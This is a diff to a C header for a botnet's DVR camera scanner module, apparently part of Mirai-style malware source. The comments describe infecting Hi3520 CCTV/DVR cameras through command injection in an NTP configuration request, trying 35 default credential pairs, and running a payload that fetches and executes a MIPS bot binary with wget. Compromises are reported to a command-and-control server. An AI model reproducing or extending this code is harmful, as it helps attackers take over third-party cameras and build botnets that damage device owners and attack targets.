@@ -1,56 +1,44 @@
-#ifdef SELFREP
-
-/* ============================================================================
- * DVR SCANNER - CCTV/DVR Camera Exploitation (Port 80)
- * ============================================================================
- * Exploit: DVR camera command injection via verify.cgi
- * Targets: CCTV/DVR cameras globally
- * Regions: Asia, Middle East, Africa, Latin America
- * Brands: Various DVR camera manufacturers
- * ============================================================================ */
-
-#pragma once
-
-#include <stdint.h>
+#ifndef _DVR_H
+#define _DVR_H
 
 #include "includes.h"
 
-#define DVR_SCANNER_MAX_CONNS   256
-#define DVR_SCANNER_RAW_PPS     788
+/* ============================================================================
+ * DVR SCANNER MODULE - CCTV/DVR Camera Exploitation (Improved)
+ * ============================================================================
+ * Exploits Hi3520-based DVR cameras via HTTP Basic Auth + XML injection
+ * Targets: CCTV/DVR cameras with /dvr/cmd or /cn/cmd endpoints
+ * Method: POST with malicious NTP server configuration
+ * Credentials: 35 username/password combinations
+ * Payload: wget http://<server>/bins/axis.mips; chmod 777; execute
+ * Reports successful compromises to C&C via SCAN_CB_PORT
+ * ============================================================================ */
 
-#define DVR_SCANNER_RDBUF_SIZE  1080
-#define DVR_SCANNER_HACK_DRAIN  64
+#define DVR_MAX_CONNS 64
+#define DVR_CONNECTION_TIMEOUT 30
+#define DVR_READ_TIMEOUT 20
 
-struct dvr_scanner_auth {
+struct dvr_credential {
     char *username;
     char *password;
-    uint16_t weight;
 };
 
-struct dvr_scanner_connection
-{
-    int fd, last_recv;
-    enum
-    {
-        DVR_SC_CLOSED,
-        DVR_SC_CONNECTING,
-        DVR_SC_GET_CREDENTIALS,
-        DVR_SC_EXPLOIT_STAGE2,
-        DVR_SC_EXPLOIT_STAGE3,
-    } state;
+struct dvr_connection {
+    int fd;
+    uint8_t state;
     ipv4_t dst_addr;
     uint16_t dst_port;
+    time_t last_recv;
+    time_t connect_time;
+    int cred_index;
+    BOOL logged_in;
+    char username[32];
+    char password[32];
+    char exploit_path[32];
+    char rdbuf[4096];
     int rdbuf_pos;
-    char rdbuf[DVR_SCANNER_RDBUF_SIZE];
-    char **credentials;
-    char payload_buf[5000], payload_buf2[5000];
-    int credential_index;
 };
 
-void dvr_scanner_init();
-void dvr_kill(void);
-
-static void dvr_setup_connection(struct dvr_scanner_connection *);
-static ipv4_t get_random_dvr_ip(void);
+void dvr_scanner_init(void);
 
 #endif
